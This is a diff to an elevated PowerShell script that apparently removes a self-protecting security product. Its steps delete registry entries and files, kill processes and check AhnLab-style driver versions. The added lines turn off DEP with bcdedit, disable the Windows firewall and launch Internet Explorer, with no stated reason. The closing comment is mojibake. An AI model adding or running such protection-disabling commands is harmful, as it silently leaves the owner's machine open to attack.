@@ -4,7 +4,7 @@
 #   Detail Function: Support to x86, x64, Driver Version Check, Delete Registry, Delete File, Kill Process, Encrypt to *.ini 
 #   error result is correct. Because of Self-Protected is ON!
 #   run with powershell Start-Process powershell -Verb runas
-
+#AhnRghNt.sys OR Amoncdw7.sys OR amoncdw8.sys OR AmonHKnt.sys OR Atamptnt.sys OR APrMDrv.sys OR ApRMctl.dll OR MPCIDRV.sys
 function OS_VER_CHK {
     if ([System.IntPtr]::Size -eq 4) { "32" } else { "64" }
 }
@@ -35,6 +35,7 @@ function DRIVER_VERSION_CHK{
 
     foreach($driver in $drivers){
         (Get-ChildItem $mypc_path -Include $driver -Recurse) | foreach-object { "{0}`t{1}" -f $_.Name, [System.Diagnostics.FileVersionInfo]::GetVersionInfo($_).FileVersion }     
+        (Get-ChildItem $common_path -Include $driver -Recurse) | foreach-object { "{0}`t{1}" -f $_.Name, [System.Diagnostics.FileVersionInfo]::GetVersionInfo($_).FileVersion }     
     }
 }
 
@@ -215,8 +216,10 @@ DELETE_FILE
 KILL_PROCESS
 INI_ENCRYPT_CHK
 
+start bcdedit.exe "/set {current} nx AlwaysOff"
+netsh advfirewall set  currentprofile state off
+start iexplore google.com
 DRIVER_VERSION_CHK
-
 echo "* Complete"
 
 #todo: error handling?¥ÏÑú ?åÏùº??†ú?????ÑÎ¶∞?∏x 
